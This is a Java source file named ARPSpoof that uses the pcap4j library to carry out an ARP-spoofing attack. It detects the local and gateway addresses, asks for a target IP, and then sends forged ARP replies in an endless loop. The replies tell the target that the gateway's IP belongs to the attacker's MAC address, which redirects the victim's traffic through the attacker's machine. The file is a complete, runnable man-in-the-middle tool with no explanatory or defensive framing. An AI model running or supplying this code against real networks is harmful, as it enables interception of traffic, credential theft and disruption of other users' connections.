import java.io.IOException;
import java.net.InetAddress;
import java.util.Scanner;

import org.pcap4j.core.BpfProgram.BpfCompileMode;
import org.pcap4j.core.NotOpenException;
import org.pcap4j.core.PcapHandle;
import org.pcap4j.core.PcapNativeException;
import org.pcap4j.core.PcapNetworkInterface;
import org.pcap4j.core.PcapNetworkInterface.PromiscuousMode;
import org.pcap4j.packet.ArpPacket;
import org.pcap4j.packet.EthernetPacket;
import org.pcap4j.packet.Packet;
import org.pcap4j.packet.namednumber.ArpHardwareType;
import org.pcap4j.packet.namednumber.ArpOperation;
import org.pcap4j.packet.namednumber.EtherType;
import org.pcap4j.util.ByteArrays;
import org.pcap4j.util.MacAddress;
import org.pcap4j.util.NifSelector;

public class ARPSpoof {
	public static void main(String [] args) throws PcapNativeException, NotOpenException, IOException {

		PcapNetworkInterface nif = null;
		try {
			nif = new NifSelector().selectNetworkInterface();
		}catch(Exception e) {}
		if(nif==null) return;

        PcapHandle handle = new PcapHandle.Builder(nif.getName())
				.snaplen(65535)			// 2^16
				.promiscuousMode(PromiscuousMode.PROMISCUOUS)
				.timeoutMillis(100)		// ms
				.bufferSize(1024*1024) // 1 MB 
				.build();

		String filter = "arp";
		handle.setFilter(filter, BpfCompileMode.OPTIMIZE);
		
        InetAddress localIP = nif.getAddresses().get(1).getAddress();
        InetAddress gatewayIP = GetAddress.getGateWayIP(localIP.getHostAddress());
		MacAddress localMac = GetAddress.getLocalMac(localIP);
		MacAddress gatewayMac = GetAddress.getMac(handle, localIP, localMac, gatewayIP);

		System.out.print  ("Local IP is: ");
		System.out.println(localIP.getHostAddress());
		System.out.print  ("Local MAC is: ");
		System.out.println(GetAddress.getMacString(localMac));
		System.out.print  ("Gateway IP is: ");
		System.out.println(gatewayIP.getHostAddress());
		System.out.print  ("Gateway MAC is: ");
		System.out.println(GetAddress.getMacString(gatewayMac));
		
        Scanner scan = new Scanner(System.in);  
        System.out.println("Input target IP Address:");  
        String t=scan.next();
        scan.close();
        
		InetAddress targetIP = InetAddress.getByName(t);
		MacAddress targetMac = GetAddress.getMac(handle, localIP, localMac, targetIP);
		
		System.out.print  ("Target IP is: ");
		System.out.println(targetIP.getHostAddress());
		System.out.print  ("Target MAC is: ");
		System.out.println(GetAddress.getMacString(targetMac));
		
		System.out.println("ARP Spoofing Started");
		while (true) {
			handle.sendPacket(buildArpPacket(ArpOperation.REPLY, gatewayIP,targetIP,localMac,targetMac));
		}
	}
	
	private static Packet buildArpPacket(ArpOperation type, InetAddress srcIP, InetAddress dstIP,MacAddress srcMac,MacAddress dstMac){
			
		ArpPacket.Builder arpBuilder = new ArpPacket.Builder();
		arpBuilder
		.hardwareType(ArpHardwareType.ETHERNET)
		.protocolType(EtherType.IPV4)
		.hardwareAddrLength((byte)MacAddress.SIZE_IN_BYTES)
		.protocolAddrLength((byte)ByteArrays.INET4_ADDRESS_SIZE_IN_BYTES)
		.operation(type)
		.srcHardwareAddr(srcMac)
		.srcProtocolAddr(srcIP)
		.dstHardwareAddr(dstMac)
		.dstProtocolAddr(dstIP);
	      
		EthernetPacket.Builder etherBuilder = new EthernetPacket.Builder();
		etherBuilder
		.dstAddr(dstMac)
		.srcAddr(srcMac)
		.type(EtherType.ARP)
		.payloadBuilder(arpBuilder)
		.paddingAtBuild(true);

		return etherBuilder.build();
	}
	/*private static InetAddress targetSelector(){
		
	}*/
}